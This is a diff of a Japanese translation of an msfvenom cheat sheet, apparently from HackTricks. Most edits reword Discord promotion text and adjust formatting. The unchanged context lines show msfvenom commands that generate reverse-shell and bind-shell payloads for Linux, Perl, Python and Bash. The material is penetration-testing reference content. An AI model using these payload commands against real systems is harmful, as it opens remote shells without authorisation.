@@ -23,10 +23,10 @@ Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to 
 ハッキングのスリルと課題に深く掘り下げたコンテンツに参加してください
 
 **Real-Time Hack News**\
-リアルタイムのニュースと洞察を通じて、急速に変化するハッキングの世界を最新の状態に保ちます
+リアルタイムのニュースと洞察を通じて、急速に変化するハッキングの世界に遅れずについていきましょう
 
 **Latest Announcements**\
-新しいバグバウンティの開始や重要なプラットフォームの更新について情報を得てください
+新しいバグバウンティの開始や重要なプラットフォームの更新について最新情報を入手してください
 
 **Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!
 
@@ -36,7 +36,7 @@ Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to 
 
 `msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`
 
-アーキテクチャを指定するには `-a` を使用するか、`--platform` を使用できます
+One can also use the `-a` to specify the architecture or the `--platform`
 
 ## Listing
 ```bash
@@ -121,6 +121,8 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
 ```bash
 msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
 ```
+{% endcode %}
+
 ### SunOS (Solaris)
 
 {% code overflow="wrap" %}
@@ -209,7 +211,9 @@ msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > 
 ```bash
 msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
 ```
-### **Bash**
+### **バッシュ**
+
+{% code overflow="wrap" %}
 ```bash
 msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
 ```
@@ -220,15 +224,15 @@ msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f
 経験豊富なハッカーやバグバウンティハンターとコミュニケーションを取るために、[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy)サーバーに参加しましょう！
 
 **ハッキングの洞察**\
-ハッキングのスリルと課題に深く掘り下げたコンテンツに参加する
+ハッキングのスリルと課題に深く掘り下げたコンテンツに参加しましょう
 
 **リアルタイムハックニュース**\
-リアルタイムのニュースと洞察を通じて、急速に変化するハッキングの世界を把握する
+リアルタイムのニュースと洞察を通じて、急速に変化するハッキングの世界に遅れずについていきましょう
 
 **最新のお知らせ**\
-新しいバグバウンティの開始や重要なプラットフォームの更新について情報を得る
+新しいバグバウンティの開始や重要なプラットフォームの更新について情報を得ましょう
 
-**私たちに参加して** [**Discord**](https://discord.com/invite/N3FrSbmwdy)で今日からトップハッカーとコラボレーションを始めましょう！
+今日、[**Discord**](https://discord.com/invite/N3FrSbmwdy)で私たちに参加し、トップハッカーとコラボレーションを始めましょう！
 
 {% hint style="success" %}
 AWSハッキングを学び、実践する：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
